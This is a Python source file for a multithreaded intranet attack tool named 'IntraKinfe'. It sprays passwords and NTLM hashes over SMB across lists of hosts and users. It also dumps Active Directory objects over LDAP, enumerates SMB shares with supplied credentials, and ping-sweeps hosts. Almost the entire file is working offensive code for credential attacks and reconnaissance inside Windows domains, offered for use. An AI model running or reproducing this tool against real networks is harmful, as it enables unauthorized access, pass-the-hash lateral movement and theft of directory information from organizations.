from impacket.smbconnection import SMBConnection
from impacket import smbconnection
from ldap3 import Server, Connection, ALL, NTLM
import argparse
import socket
import sys
import threading
import time
import queue
import os

# global var
password = ''
nthash = ''
mode = ''
username = ''

# hash spray
def spray(username, password, nthash, target_ip, port=445):
    if '/' in username:
        domain = username.split('/')[0]
        username = username.split('/')[1]
    else:
        domain = ''
    #print(username+' '+domain+' '+password+' '+nthash)
    try:
        smbClient = SMBConnection(target_ip, target_ip, sess_port=int(port))
        smbClient.login(username, password=password, domain=domain, nthash=nthash)
        SMBConnection.close
        print('[+] {0} / user:{1}, password:{2}, hash:{3}'.format(target_ip,username,password,nthash))
        return True
    except smbconnection.SessionError as e:
        return False
    except Exception as e:
        #print('[-] {} seems error...'.format(target_ip))
        return False
    
# adinfo search
def adinfo(username,password,target_ip,dn,filter):
    server = Server(target_ip, get_info=ALL)
    try:
        conn = Connection(server, user=username, password=password, auto_bind=True, authentication=NTLM)
        conn.search(dn, search_filter="(objectclass={})".format(filter), attributes=["*"])
    except:
        print('[-] search error...')
        sys.exit(1)
    for i in conn.response:
        if 'attributes' in i:
            for n in i['attributes']:
                #print(n+' : ' + ''.join(i['attributes'][n])+'\n')
                try:
                    print(n+' : ' + str(i['attributes'][n]))
                except:
                    print(n+' : ' + ','.join(i['attributes'][n]))
            print('\n')

# list share folder
def list_share(username,password,nthash,target_ip):
    if '/' in username:
        domain = username.split('/')[0]
        username = username.split('/')[1]
    else:
        domain = ''
    try:
        smbClient = SMBConnection(target_ip, target_ip, sess_port=445)
        smbClient.login(username, password=password, domain=domain, nthash=nthash)
        shares = []
        resp = smbClient.listShares()
        for i in range(len(resp)):
            shares.append(resp[i]['shi1_netname'][:-1])
        print('[+] '+target_ip+': '+', '.join(shares))
    except:
        print('[-] '+target_ip+': '+'error...')
        sys.exit(1)


# parse dns
def domain2ip(target_ip):
        try:
            print(target_ip+': '+socket.gethostbyname(target_ip))
        except:
            print(target_ip+': error...')

# find alive
def findalive(target_ip):
    try:
        a = os.popen('ping -n 1 {}'.format(target_ip))
        res = a.read()
        if 'TTL=' in res:
            print('[+] {} is alive'.format(target_ip))
    except:
        print('[-] {} error'.format(target_ip))
    
# mutli threading
class MyThread(threading.Thread):
    def __init__(self, func):
        threading.Thread.__init__(self)
        self.func = func
    def run(self):
        self.func()

def worker():
    global mode,username,nthash,password
    if mode == 'spray':
        while not q.empty():
            (target_ip,user) = q.get()
            #i = num - q.qsize()
            spray(user, password, nthash, target_ip)
            time.sleep(1)
    elif mode == 'share':
        while not q.empty():
            target_ip = q.get()
            #i = num - q.qsize()
            list_share(username, password, nthash, target_ip)
            time.sleep(1)
    elif mode == 'dns':
        while not q.empty():
            target_ip = q.get()
            #i = num - q.qsize()
            domain2ip(target_ip)
            time.sleep(1)
    elif mode == 'active':
        while not q.empty():
            target_ip = q.get()
            #i = num - q.qsize()
            findalive(target_ip)
            time.sleep(1)
    else:
        sys.exit(1)

def start_thread(num):
    threads = []
    for m in range(int(num)):  
        thread = MyThread(worker)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

# main function
def main():
    parser = argparse.ArgumentParser(add_help = True, description = "IntraKinfe: it's an amazing intranet tool")
    parser.add_argument('-m', action='store', dest = "mode", help='mode u want to use: [ spray|adinfo|share|dns|active ]')
    parser.add_argument('-U', action='store', dest = "userlist", help='List of users to spray')
    parser.add_argument('-u', action='store', dest = "user", help='point the username')
    parser.add_argument('-P', action='store', dest = "password", help='clear words password')
    parser.add_argument('-ha', action='store', dest = "hashes", help='LM:NTLM')
    parser.add_argument('-l', action='store', dest = "computerlist", help='Computer_list')
    parser.add_argument('-p', action='store', default='445', dest = "port", help='target_port')
    parser.add_argument('-t', action='store', default='20', dest = "thread", help='threading')
    parser.add_argument('-d', action='store', dest = "dc_ip", help='dc ip for adinfo query')
    parser.add_argument('-dn', action='store', dest = "DN", help='DN for adinfo query: "dc=xxx,dc=com"')
    parser.add_argument('-f', action='store', dest = "filter", help='filter for adinfo query: [ user|computer|group ]')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    options = parser.parse_args()

    global mode,username,nthash,password
    mode = options.mode
    num = options.thread
    print('[*] starting u game...')
    # spray hash
    if options.mode == 'spray':
        #print(10)
        if (options.password is None and options.hashes is None) or options.computerlist is None or options.userlist is None:
            parser.print_help()
            sys.exit(1)
        if options.password is None:
            nthash = options.hashes
        if options.hashes is None:
            password = options.password
        for ip in open(options.computerlist,'r').readlines():
            for user in open(options.userlist,'r').readlines():
                q.put((ip.strip(),user.strip()))
        start_thread(num)

    # search adinfo       
    elif options.mode == 'adinfo':
        if options.user is None or options.password is None or options.dc_ip is None or options.DN is None or options.filter is None:
            parser.print_help()
            sys.exit(1)
        adinfo(options.user,options.password,options.dc_ip,options.DN,options.filter)

    # list share
    elif options.mode == 'share':
        if (options.password is None and options.hashes is None) or options.computerlist is None or options.user is None:
            parser.print_help()
            sys.exit(1)
        if options.password is None:
            nthash = options.hashes
        if options.hashes is None:
            password = options.password
        username = options.user
        for ip in open(options.computerlist,'r').readlines():
            q.put(ip.strip())
        start_thread(num)
    
    # parse dns and find active
    elif options.mode == 'dns' or options.mode == 'active':
        if options.computerlist is None:
            parser.print_help()
            sys.exit(1)
        for ip in open(options.computerlist,'r').readlines():
            q.put(ip.strip())
        start_thread(num)
    
    else:
        print('[-] wrong mode...')
        parser.print_help()
        sys.exit(1)


if __name__ == '__main__':
    q = queue.Queue()
    main()
            
        



    